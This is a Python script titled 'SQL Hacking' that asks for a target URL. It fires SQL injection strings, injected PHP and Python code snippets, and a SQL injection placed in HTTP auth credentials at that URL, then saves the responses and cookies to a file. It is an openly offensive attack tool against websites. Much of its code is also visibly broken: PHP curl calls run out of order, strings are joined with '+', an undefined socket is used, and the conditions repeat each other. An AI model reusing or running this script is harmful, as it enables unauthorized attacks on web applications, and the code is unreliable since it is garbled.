
from payl import SQL_INJECT_REQUESTS, userahents
from colorama import Back, Fore
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from requests import Session
import requests, random

logo = """

░██████╗░██████╗░██╗░░░░░  ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
██╔════╝██╔═══██╗██║░░░░░  ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
╚█████╗░██║██╗██║██║░░░░░  ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
░╚═══██╗╚██████╔╝██║░░░░░  ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗
██████╔╝░╚═██╔═╝░███████╗  ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝
╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░ 

& By: Difficult

"""
print(Fore.RED+logo)

url = input(Fore.GREEN+'Enter URL: ')

code_php = """
<?php

$ip = "https://api.ipify.org"; 
$chs = curl_init(); 

$response_ip = curl_exec($chs); 

curl_setopt($chs, CURLOPT_URL, $ip."?".$queryString);
curl_setopt($chs, CURLOPT_RETURNTRANSFER, true);

echo $chs 
$url = "http://ip-api.com/json/" + $ip;
$ch = curl_init();

$response = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, $url."?".$queryString);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

if(curl_errno($ch)){
    echo 'Ошибка cURL: '.curl_error($ch);
}

curl_close($ch);

echo $response;

?>

""" 

code_python = f"""
import requests 

url = {url}

so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
ip = requests.get('https://api.ipify.org').text
urlloc = 'http://ip-api.com/json/' + ip
location1 = requests.get(urlloc, headers=headers).text 
print(location1)
"""

headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': random.choice(userahents), 
}

payload = { 
    'code': code_php,   
    'query': SQL_INJECT_REQUESTS[0], 
}

pay = { 
      'code': code_python,
      'query': SQL_INJECT_REQUESTS[0],  
}

options = webdriver.ChromeOptions() 
options.add_argument(f'user-agent={random.choice(userahents)}') 
options.add_argument(f'code={code_php}') 
# options.add_argument(f'proxy={}')
driver = webdriver.Chrome(options=options) 
driver.get(url)

response_get = requests.get(url, headers=headers, params=payload, data=pay)
print(response_get.text)

response_post = requests.post(url, headers=headers, params = payload)
new_ses = Session() 
s = new_ses.options(url=url, headers=headers, data= pay) 

print(s.text)
print(response_post) 

if response_post.text == "Hacking attempt!":
    
    if response_post.text == "Hacking attempt!":  
         ses = Session()
         ses.options(url= url, headers=headers, data=payload) 
         ses.auth = ("Admin", "SELECT * FROM users WHERE username = 'administrator'--' AND password = ''")
         print(ses.adapters)
         print(ses.proxies)
     
         response_new = requests.post(url=url, headers={ 
                   'User-Agent': random.choice(userahents)
              }, data=payload)  
         print(response_new.content)
         
         infile = response_get.text, response_post.content, ses.cookies, ses.adapters, ses.auth
         with open("result.txt", 'w', encoding='utf-8') as file: 
               file.write(str(infile))
         if response_post.text == "Hacking attempt!": 
                   pass
    else: 
         print(response_post.text)
         print(response_post.content) 
         print(response_post.headers) 
         print(response_post.history)
         
else: 
     print("not ")